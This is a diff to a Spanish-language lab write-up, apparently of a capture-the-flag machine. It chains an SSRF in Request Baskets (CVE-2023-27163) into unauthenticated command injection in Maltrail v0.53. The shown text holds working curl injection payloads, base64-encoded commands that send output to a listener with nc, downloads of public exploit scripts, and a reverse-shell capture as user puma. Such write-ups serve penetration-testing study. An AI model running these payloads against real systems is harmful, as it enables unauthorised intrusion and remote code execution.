@@ -28,29 +28,56 @@ whatweb http://10.129.229.26:55555/
 
 ## SSRF en Request Baskets (CVE-2023-27163)
 
-Request Baskets en versiones <= 1.2.1 permite crear una cesta cuyo `forward_url` apunta a cualquier URL, incluyendo direcciones internas del propio host, lo que habilita SSRF hacia servicios que solo escuchan en localhost. Usé el PoC público de la CVE:
+`searchsploit request-baskets` no devolvió nada local, así que antes de buscar un PoC probé la API a mano. Fui iterando contra puertos y rutas equivocadas (`5000`, `50000`, `/baskets/test` sin el prefijo `/api/`) hasta confirmar que la API real vive en el propio 55555, bajo `/api/baskets/<nombre>`:
+
+```
+curl -X POST "http://10.129.229.26:55555/api/baskets/test2"
+curl -X GET "http://10.129.229.26:55555/baskets/test2"
+```
+
+Con la ruta correcta localizada, Request Baskets en versiones <= 1.2.1 permite crear una cesta cuyo `forward_url` apunta a cualquier URL, incluyendo direcciones internas del propio host, lo que habilita SSRF hacia servicios que solo escuchan en localhost. Usé el PoC público de la CVE en vez de seguir construyendo el JSON a mano:
 
 ```
 wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh
 chmod +x CVE-2023-27163.sh
+./CVE-2023-27163.sh http://10.129.229.26:55555/ localhost
+```
+
+La primera prueba con `localhost` como destino fue solo para confirmar que el script funcionaba. La repetí apuntando de verdad al loopback del objetivo:
+
+```
 ./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1
 ```
 
-El script crea una cesta que reenvía las peticiones hacia `127.0.0.1`. Consultando esa cesta quedó expuesto qué corre en el localhost del host, solo accesible desde dentro: una instancia de Maltrail v0.53.
+La cesta creada reenvía las peticiones hacia `127.0.0.1`. Antes de saber qué había ahí probé también forzar la ruta `/login` en el forward:
+
+```
+./CVE-2023-27163.sh http://10.129.229.26:55555/ http://127.0.0.1/login
+```
+
+Consultando la cesta quedó expuesto qué corre en el localhost del host, solo accesible desde dentro: una instancia de Maltrail v0.53.
 
 ## RCE en Maltrail v0.53
 
-Maltrail v0.53 tiene una inyección de comandos no autenticada en el endpoint de login, a través del parámetro `username`, que se procesa sin sanitizar. Usando la cesta creada por el PoC como proxy hacia el Maltrail interno, probé la inyección directamente contra la ruta de la cesta:
+`searchsploit Maltrail` (probando varias grafías: `Maltrail (v0.53)`, `Maltrail v0.53`, `Maltrail 0.53`) tampoco devolvió nada local. Maltrail v0.53 tiene una inyección de comandos no autenticada en el endpoint de login, a través del parámetro `username`, que se procesa sin sanitizar. Antes de intentar una reverse shell confirmé la ejecución con un comando simple, probando tanto backticks como `$()`, contra la cesta que actúa de proxy hacia el Maltrail interno:
 
 ```
+curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;`id`;'
+curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;$(id);'
+```
+
+Con la inyección confirmada, un one-liner de reverse shell normal (con paréntesis, comillas y `&`) no sobrevivía al paso por el body del POST y el propio shell remoto. Para evitarlo, codifiqué el payload en base64 y lo decodifiqué en remoto antes de ejecutarlo. Los primeros intentos fallaron porque el comando codificado no incluía el puerto del listener:
+
+```
+echo -n "id | nc 10.10.14.224" | base64
+curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;echo aWQgfCBuYyAxMC4xMC4xNC4yMjQ= | base64 -d;'
+```
+
+Añadí el puerto y probé primero contra el 80, que exige root para escuchar, así que cambié a un puerto alto (4444):
+
+```
+echo -n "id | nc 10.10.14.224 4444" | base64
 curl 'http://10.129.229.26:55555/bsmoel' -d 'username=;`echo aWQgfCBuYyAxMC4xMC4xNC4yMjQgNDQ0NA== | base64 -d | sh`'
-```
-
-Después usé el exploit público para automatizar el envío de una reverse shell:
-
-```
-wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
-python3 exploit.py 10.10.14.224 4444 http://10.129.229.26:55555/bsmoel
 ```
 
 Con un listener en escucha capturé conexión como `puma`:
@@ -60,6 +87,19 @@ $ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.224] from (UNKNOWN) [10.129.229.26] 49112
 uid=1001(puma) gid=1001(puma) groups=1001(puma)
+```
+
+Esa conexión manual con `nc` no era una pty completa. Para tener una shell estable usé el exploit público de Maltrail v0.53, que hace lo mismo pero spawnea una pty:
+
+```
+wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py
+python3 exploit.py 10.10.14.224 4444 http://10.129.229.26:55555/bsmoel
+```
+
+Hicieron falta varios reintentos, reiniciando el listener y ajustando el script, hasta que se estabilizó la conexión. Con la shell ya como `puma`, hice el upgrade de TTY habitual:
+
+```
+stty raw -echo; fg
 ```
 
 ## Escalada a root
